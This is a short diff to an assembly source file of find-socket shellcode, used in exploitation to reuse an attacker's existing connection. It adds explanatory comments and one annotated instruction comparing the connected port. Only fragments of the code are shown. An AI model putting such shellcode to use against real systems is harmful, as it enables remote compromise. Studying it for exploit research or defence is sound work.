@@ -1,6 +1,10 @@
 ; Leander Metcalf
 ; 30 November 2014
 ;
+; This shellcode finds the file descriptor to which you are connected
+; by comparing your connected port to what the file descriptor has
+; for your socket pair.
+;
 ; nasm -f bin findsock-shellcode.asm
 ; 83 Bytes with no 0x00 or 0x0a bytes
 
@@ -40,7 +44,7 @@ findSock:
   	cmp      ax, bx
   	jne      next_sockfd
 check_sock_addr:
-  	mov      bx, 0x3905
+  	mov      bx, 0x3905	;connected port
 	mov	 edi, [edx + 2]
   	cmp      bx, di
   	je       exitLoop
